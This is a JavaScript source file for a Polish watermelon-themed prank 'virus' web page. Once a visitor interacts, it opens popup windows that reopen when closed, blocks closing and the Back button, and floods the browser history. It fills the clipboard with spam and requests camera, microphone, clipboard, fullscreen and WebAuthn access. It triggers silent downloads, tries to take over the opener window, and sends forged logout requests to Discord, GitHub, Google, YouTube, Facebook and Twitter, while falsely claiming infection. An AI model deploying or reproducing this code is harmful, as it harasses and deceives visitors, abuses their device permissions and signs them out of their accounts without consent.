/*
  Arbuzowy Wirus 404
  Based on ptoszek.pl by Jaczup
  Modified for watermelon theme
*/

/* Latające Okinenka 404 z arubzem!! */

// Konfiguracja okienek
const SCREEN_WIDTH = window.screen.availWidth;
const SCREEN_HEIGHT = window.screen.availHeight;
const WIN_WIDTH = 400;  // Szerokość okienka
const WIN_HEIGHT = 300; // Wysokość okienka
const VELOCITY = 10;    // Prędkość poruszania się
const MARGIN = 50;      // Margines od krawędzi ekranu
const TICK_LENGTH = 50; // Częstotliwość odświeżania pozycji (ms)

let windows = []; // Tablica przechowująca otwarte okna

// Funkcja otwierająca nowe okno
function openFlyingWindow() {
    const x = Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN * 2) + MARGIN;
    const y = Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN * 2) + MARGIN;

    const win = window.open(
        "", // Puste URL (możesz dać np. "about:blank")
        "FlyingWindow", 
        `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y},scrollbars=yes,resizable=no`
    );

    if (win) {
        // Wypełnij okno treścią (np. gifem arbuzowym)
        win.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>🍉 ARBUZOWY WIRUS 🍉</title>
                <style>
                    body { 
                        margin: 0; 
                        padding: 0; 
                        background: black; 
                        overflow: hidden;
                        cursor: none;
                    }
                    img { 
                        width: 100%; 
                        height: 100%; 
                        object-fit: cover;
                    }
                </style>
            </head>
            <body>
                <img src="media/gif/arbuz.gif" alt="ARBUZOWY WIRUS">
                <script>
                    // Blokuj zamknięcie okna
                    window.onbeforeunload = function() {
                        return "NIE MOŻESZ UCIEKAĆ PRZED ARBUZEM!";
                    };
                </script>
            </body>
            </html>
        `);

        windows.push(win);
        moveWindow(win); // Uruchom animację ruchu
    } else {
        console.error("Failed to open new window.");
    }
  }

// Funkcja poruszająca oknem
function moveWindow(win) {
    let x = parseInt(win.screenX || win.screenLeft);
    let y = parseInt(win.screenY || win.screenTop);
    let xVelocity = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
    let yVelocity = VELOCITY * (Math.random() > 0.5 ? 1 : -1);

    const interval = setInterval(() => {
        if (win.closed) {
            // Otwórz 1.mp4 w nowym oknie po 2 sekundach, ale tylko raz dla każdego okna
            if (win && !win.closed && !win.mp4_1Opened) {
              win.mp4_1Opened = true;
              setTimeout(() => {
                if (win && !win.closed) { // Dodano kontrolę istnienia okna
                  const x = Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN * 2) + MARGIN;
                  const y = Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN * 2) + MARGIN;
                    // Sprawdź, czy okno nie zostało zamknięte przed otwarciem nowego okna
                    if (!win.closed) {
                  const win2 = window.open(
                    "media/videos/1.mp4",
                    "FlyingWindow2",
                    `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y},scrollbars=yes,resizable=no`
                  );
                  if (win2) {
                    windows.push(win2);
                  }
                }
              }
            }, 2000);
            }
            // Otwórz 2.mp4 w nowej karcie po kilku sekundach (np. 5 sekund)
            if (win && !win.closed && !win.mp4Opened) {
              win.mp4Opened = true; // Ustaw flagę, aby otworzyć tylko raz
              setTimeout(() => {
                if (win && !win.closed) { // Dodano kontrolę istnienia okna
                  window.open('media/videos/2.mp4', '_blank');
                  if (win && !win.closed) {
                    openFlyingWindow();
                  }
                }
            }, 5000);
            }

            clearInterval(interval);
          } else {

          x += xVelocity;
          y += yVelocity;

          // Odbijanie od krawędzi ekranu
          if (x + WIN_WIDTH > SCREEN_WIDTH || x < 0) {
            xVelocity = -xVelocity;
            x = Math.max(0, Math.min(x, SCREEN_WIDTH - WIN_WIDTH));
          }

          if (y + WIN_HEIGHT > SCREEN_HEIGHT || y < 0) {
            yVelocity = -yVelocity;
            y = Math.max(0, Math.min(y, SCREEN_HEIGHT - WIN_HEIGHT));
          }

          // Przesuń okno
          try {
            win.moveTo(x, y);
            } catch (e) {}
          }
        }, TICK_LENGTH);
      }

// Otwórz kilka okienek po załadowaniu strony
window.onload = function() {
    for (let i = 0; i < 5; i++) {
        setTimeout(openFlyingWindow, i * 1000);
    }
};

// Blokuj zamknięcie głównego okna
window.onbeforeunload = function(e) {
    // Prevent default to stop the browser from navigating away
    e.preventDefault();
    e.returnValue = "NIE MOŻESZ UCIEKAĆ! ARBUZOWY WIRUS ZOSTAJE!";
    return "NIE MOŻESZ UCIEKAĆ! ARBUZOWY WIRUS ZOSTAJE!";
};

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
  🍉🍉🍉🍉🍉🍉🍉
  🍉 ARBUZOWY 🍉
  🍉  WIRUS   🍉
  🍉🍉🍉🍉🍉🍉🍉
  `,
  `
  💦💦💦💦💦💦💦
  💦 404 404  💦
  💦 404 404  💦
  💦💦💦💦💦💦💦
  `
]

const SEARCHES = [
  'arbuzowy wirus',
  '404 wirus',
  'free pady arbuzowe',
  'jak usunąć arbuzowy wirus',
  'pomocy arbuz'
]

const VIDEOS = [
  'media/videos/arbuz.mp4',
  'media/videos/404.mp4',
  'media/videos/watermelon.mp4'
]

const FILE_DOWNLOADS = [
  'media/images/arbuz.jpg',
  'media/images/wirus.jpg',
  'media/images/pady.jpg'
]

const PHRASES = [
  '404 404 404 ARBUZOWY WIRUS',
  'TWÓJ KOMPUTER ZOSTAŁ ZARAZONY',
  'PADY ARBUZOWE WKRÓTCE U CIEBIE',
  'ERROR 404 WIRUS NOT FOUND',
  'WODA ARBUZOWA WKRÓTCE W TWOIM KOMPUTERZE',
  'ZAINSTALOWANO ARBUZOWE PADY',
  'SYSTEM ZAINFEKOWANY ARBUZEM'
]

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  GitHub: ['GET', 'https://github.com/logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  Facebook: ['GET', 'https://www.facebook.com/logout.php'],
  Twitter: ['GET', 'https://twitter.com/logout']
}

const wins = []
let interactionCount = 0
const veryLongString = repeatStringNumTimes(repeatStringNumTimes('404 ARBUZOWY WIRUS!!1 ',100),1500)
let numSuperLogoutIframes = 0

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  (window.location.search && window.location.search.indexOf('child=true') !== -1)
let windowState = 'moving'; // Możliwe stany: 'moving', 'still'
let stillTime = 0;
const STILL_DURATION = 3000; // Czas trwania stanu "still" w milisekundach
let stillStartTime = 0;
const isParentWindow = !isChildWindow

init()

if (isChildWindow) initChildWindow()
else initParentWindow()

function init () {
  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1
    if (event.which !== 0) {
      event.preventDefault()
      openWindow()
    }
    event.stopPropagation()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()

    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
    } else {
      requestPointerLock()
      if (!window.ApplePaySession) {
        requestWebauthnAttestation()
      }
      requestClipboardRead()
      requestCameraAndMic()
      requestFullscreen()
    }
  })
}

function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('To był błąd')
    }
  })
}

function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

function isParentSameOrigin () {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('ARBUZOWY WIRUS NIE POZWALA CI WYJŚĆ!')
    event.returnValue = true
  })
}

function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Arbuzowy Wirus')
  })
}

function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => {})
    }, () => {})
  })
}

function animateUrlWithEmojis () {
  if (window.ApplePaySession) return
  
  const rand = Math.random()
  if (rand < 0.5) {
    animateUrlWithWatermelons()
  } else {
    animateUrlWithNumbers()
  }

  function animateUrlWithWatermelons() {
    const e = ['🍉', '💦', '🔴', '🟢']
    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        const m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += e[m]
      }
      window.location.hash = s
    }, 100)
  }

  function animateUrlWithNumbers() {
    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        const n = Math.floor(Math.random() * 10)
        s += n === 4 ? '💦' : n.toString()
      }
      window.location.hash = s
    }, 100)
  }
}

function requestPointerLock () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )
  requestPointerLockApi.call(document.body)
}

function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)
}

function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })
  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)
  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()
  document.body.appendChild(video)
}

function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

function openWindow () {
  const x = Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN * 2) + MARGIN
  const y = Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN * 2) + MARGIN

  let win = window.open(
    window.location.href,
    'Arbuzowy Wirus',
    `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y},scrollbars=yes`
  )

  if (win) wins.push(win);
}

function focusWindows () {
  wins.forEach(win => {
    try {
      if (!win.closed) win.focus()
    } catch (err) {}
  })
}

function copySpamToClipboard () {
  if (typeof navigator.clipboard.writeText !== 'function') return
  navigator.clipboard.writeText(veryLongString).catch(() => {})
}

function speak (text) {
  if (typeof window.speechSynthesis === 'undefined') return
  const utterance = new SpeechSynthesisUtterance(text || getRandomArrayEntry(PHRASES))
  utterance.rate = 0.8 + Math.random() * 0.4
  utterance.pitch = 0.8 + Math.random() * 0.4
  window.speechSynthesis.speak(utterance)
}

function startTheramin () {
  const audioContext = new (window.AudioContext || window.webkitAudioContext)()
  const oscillator = audioContext.createOscillator()
  oscillator.type = 'sine'
  oscillator.frequency.value = 300 + Math.random() * 600
  oscillator.start()

  const gainNode = audioContext.createGain()
  gainNode.gain.value = 0.1

  oscillator.connect(gainNode)
  gainNode.connect(audioContext.destination)

  setTimeout(() => {
    gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.5)
    setTimeout(() => oscillator.stop(), 500)
  }, 100)
}

function requestWebauthnAttestation () {
  if (!window.PublicKeyCredential) return
  const challenge = new Uint8Array(32)
  window.crypto.getRandomValues(challenge)

  const publicKeyCredentialCreationOptions = {
    challenge,
    rp: {
      name: 'Arbuzowy Wirus',
      id: 'arbuzowywirus.pl'
    },
    user: {
      id: new Uint8Array(16),
      name: 'user@arbuzowywirus.pl',
      displayName: 'ARBUZ'
    },
    pubKeyCredParams: [
      {
        type: 'public-key',
        alg: -7
      }
    ],
    timeout: 60000,
    attestation: 'direct'
  }

  navigator.credentials.create({
    publicKey: publicKeyCredentialCreationOptions
  }).catch(() => {})
}

function requestClipboardRead () {
  if (typeof navigator.clipboard.readText !== 'function') return
  navigator.clipboard.readText().catch(() => {})
}

function requestFullscreen () {
  const requestFullscreenApi = (
    document.body.requestFullscreen ||
    document.body.webkitRequestFullscreen ||
    document.body.mozRequestFullScreen ||
    document.body.msRequestFullscreen
  )
  requestFullscreenApi.call(document.body).catch(() => {})
}

function hideCursor () {
  document.body.style.cursor = 'none'
}

function moveWindowBounce () {
  let x = Math.random() * (SCREEN_WIDTH - WIN_WIDTH)
  let y = Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT)
  let xVelocity = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let yVelocity = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    x += xVelocity
    y += yVelocity

    if (x + WIN_WIDTH > SCREEN_WIDTH || x < 0) {
      xVelocity = -xVelocity
      x = Math.max(0, Math.min(x, SCREEN_WIDTH - WIN_WIDTH))
    }

    if (y + WIN_HEIGHT > SCREEN_HEIGHT || y < 0) {
      yVelocity = -yVelocity
      y = Math.max(0, Math.min(y, SCREEN_HEIGHT - WIN_HEIGHT))
    }

    try {
      window.moveTo(x, y)
    } catch (err) {}
  }, TICK_LENGTH)
}

function startVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.autoplay = true
  video.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1;'
  video.play()
  document.body.appendChild(video)
}

function detectWindowClose () {
  setInterval(() => {
    if (window.closed) {
      openWindow()
    }
  }, 1000)
}

function triggerFileDownload () {
  const a = document.createElement('a')
  a.href = getRandomArrayEntry(FILE_DOWNLOADS)
  a.download = 'ARBUZOWY_WIRUS_' + Math.floor(Math.random() * 10000) + '.jpg'
  a.style = HIDDEN_STYLE
  document.body.appendChild(a)
  a.click()
  setTimeout(() => document.body.removeChild(a), 1000)
}

function showHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  if (helloMessage) helloMessage.style.display = 'block'
}

function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  if (helloMessage) helloMessage.style.display = 'none'
}

function blockBackButton () {
  window.history.pushState(null, null, window.location.href)
  window.onpopstate = () => {
    window.history.pushState(null, null, window.location.href)
    speak('NIE MOŻESZ UCIEKAĆ PRZED ARBUZOWYM WIRUSEM!')
  }
}

function fillHistory () {
  for (let i = 0; i < 50; i++) {
    window.history.pushState(null, null, window.location.href + '#' + i)
  }
}

function startAlertInterval () {
  setInterval(() => {
    alert('ARBUZOWY WIRUS ZAINFEKOWAŁ TWÓJ KOMPUTER!\nERROR 404')
  }, 15000)
}

function superLogout () {
  const logoutMessages = document.querySelector('.logout-messages')
  if (!logoutMessages) return

  Object.entries(LOGOUT_SITES).forEach(([site, [method, url, body]], i) => {
    setTimeout(() => {
      const message = document.createElement('div')
      message.style = `font-size: ${20 + i}px; transform: rotate(${Math.random() * 20 - 10}deg);`
      message.textContent = `WYLOGOWANO Z ${site.toUpperCase()}!`
      logoutMessages.appendChild(message)

      if (method === 'GET') {
        const iframe = document.createElement('iframe')
        iframe.src = url
        iframe.style = HIDDEN_STYLE
        document.body.appendChild(iframe)
        numSuperLogoutIframes++
      } else {
        fetch(url, {
          method,
          body: body ? JSON.stringify(body) : undefined,
          credentials: 'include'
        }).catch(() => {})
      }
    }, i * 500)
  })
}

function rainbowThemeColor () {
  let hue = 0
  setInterval(() => {
    hue = (hue + 5) % 360
    document.querySelector('meta[name="theme-color"]').setAttribute('content', `hsl(${hue}, 80%, 50%)`)
  }, 100)
}

function getRandomArrayEntry (array) {
  return array[Math.floor(Math.random() * array.length)]
}

function repeatStringNumTimes (string, times) {
  if (times <= 0) return ''
  if (times === 1) return string
  return string + repeatStringNumTimes(string, times - 1)
}